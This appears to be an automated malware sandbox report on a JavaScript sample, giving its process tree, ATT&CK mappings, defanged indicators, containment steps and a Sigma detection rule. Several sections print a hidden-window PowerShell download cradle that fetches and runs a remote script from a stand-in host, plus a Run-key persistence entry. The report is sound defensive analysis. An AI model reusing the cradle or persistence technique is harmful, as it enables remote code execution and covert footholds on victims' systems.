# Malware Sandbox Report — Scan_0912.js

> **Generated:** 2026-11-01 08:28 UTC · **Tool:** sandboxscribe 1.0.0 · **SHA-256:** `n/a`

## 1. Verdict

### 🔴 MALICIOUS — score 70/100 — confidence HIGH

## 2. What the sample does

1. **Execution** — Command line downloads a payload from the network. _powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://files-sync-4k8d2x9q.example/a.ps1')"_
2. **Execution** — PowerShell launched with stealth flags (no profile / hidden window / policy bypass). _powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://files-sync-4k8d2x9q.example/a.ps1')"_
3. **Persistence** — Autostart persistence (Run key / Startup folder). _HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\SyncService [] = C:\Users\analyst\AppData\Roaming\syncsvc.exe_
4. **Defense Evasion** — Initial sample deleted after execution. _C:\Users\analyst\Downloads\Scan_0912.js_

## 3. Containment recommendation

**Immediate (stop the spread)**

- Isolate every host that executed the sample (EDR network containment) and kill the process tree shown in the report.
- Block at DNS / proxy / firewall: files-sync-4k8d2x9q.example, 198.51.100.77.

**Eradicate (remove what it installed)**

- Delete registry persistence HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\SyncService (points to C:\Users\analyst\AppData\Roaming\syncsvc.exe).
- Remove dropped file C:\Users\analyst\AppData\Roaming\syncsvc.exe.

**Hunt (find the siblings)**

- Search EDR / SIEM for the sample hashes and dropped-file names across the whole fleet over the last 30 days.
- Search proxy / DNS / NetFlow history for the domains and IPs; each hit is a potentially compromised host.
- Deploy the generated Sigma rules (see sigma/) as detections, then back-test them on 30 days of logs.

**Recover & communicate**

- Notify affected users, submit the sample to the AV vendor and share IOCs with trusted partners (ISAC / CERT).
- Record the case and update the detection backlog with every TTP that was not alerted on.

---

## 4. Sample & environment

| Field | Value |
|---|---|
| Name | Scan_0912.js |
| Type |  |
| Size | 0 bytes |
| SHA-256 |  |
| SHA-1 |  |
| MD5 |  |
| Sandbox | manual VM + Sysmon |
| OS | Windows (Sysmon export) |
| Runtime | 4 s |
| Network mode | unknown |
| Events analysed | 7 |

## 5. Process tree

```text
wscript.exe (pid 4400)  "C:\Windows\System32\wscript.exe" "C:\Users\analyst\Downloads\Scan_0912.js"
└─ powershell.exe (pid 4500)  powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('htt
```

## 6. Behaviour timeline

| T+ (s) | Event | Detections |
|---|---|---|
| 0.0 | Process started: wscript.exe — "C:\Windows\System32\wscript.exe" "C:\Users\analyst\Downloads\Scan_0912.js" |  |
| 1.3 | Process started: powershell.exe — powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://files-sync-4k8d2x9q.exampl | DOWNLOAD_CRADLE, PS_EVASIVE_FLAGS |
| 1.9 | DNS query: files-sync-4k8d2x9q.example → 198.51.100.77 |  |
| 2.2 | Connection: 198.51.100.77:80/tcp |  |
| 3.0 | File written: C:\Users\analyst\AppData\Roaming\syncsvc.exe |  |
| 3.5 | Registry set: HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\SyncService [] = C:\Users\analyst\AppData\Roaming\syncsvc.exe | PERSIST_RUN_KEY |
| 4.9 | File deleted: C:\Users\analyst\Downloads\Scan_0912.js | SELF_DELETE |

## 7. Detections & MITRE ATT&CK

| Weight | Tactic | Technique | Finding | Evidence |
|---|---|---|---|---|
| 25 | Persistence | T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Autostart persistence (Run key / Startup folder) | HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\SyncService [] = C:\Users\analyst\AppData\Roaming\syncsvc.exe |
| 20 | Execution | T1105 Ingress Tool Transfer | Command line downloads a payload from the network | powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://files-sync-4k8d2x9q.example/a.ps1')" |
| 15 | Execution | T1059.001 Command and Scripting Interpreter: PowerShell | PowerShell launched with stealth flags (no profile / hidden window / policy bypass) | powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://files-sync-4k8d2x9q.example/a.ps1')" |
| 10 | Defense Evasion | T1070.004 Indicator Removal: File Deletion | Initial sample deleted after execution | C:\Users\analyst\Downloads\Scan_0912.js |

**Kill-chain coverage:** **Execution** → **Persistence** → **Defense Evasion** → ~~Credential Access~~ → ~~Discovery~~ → ~~Command and Control~~ → ~~Exfiltration~~ → ~~Impact~~

## 8. Indicators of compromise (defanged)

| Type | Value | Context |
|---|---|---|
| domain | files-sync-4k8d2x9q[.]example | contacted |
| ip | 198[.]51[.]100[.]77 | contacted |
| registry | HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\SyncService | data=C:\Users\analyst\AppData\Roaming\syncsvc.exe |
| file | C:\Users\analyst\AppData\Roaming\syncsvc.exe | dropped |

## 9. Detection rules generated (Sigma)

Written to `--sigma-dir`: `dns_c2_nosha.yml`, `dropped_file_nosha.yml`, `net_c2_nosha.yml`, `persist_run_key_nosha.yml`

Example — `dns_c2_nosha.yml`:

```yaml
title: DNS Query to Domain Contacted by Analysed Sample
id: de440bfe-11e1-5c13-a1cd-c8ca47383255
status: experimental
description: Domains resolved by the sample during detonation.
author: SandboxScribe
date: 2026/11/01
tags:
    - attack.command-and-control
    - attack.t1071.001
logsource:
    category: dns_query
    product: windows
detection:
    selection:
        QueryName|endswith:
            - 'files-sync-4k8d2x9q.example'
    condition: selection
falsepositives:
    - Legitimate use of the same binaries/paths; tune before production
level: high
```
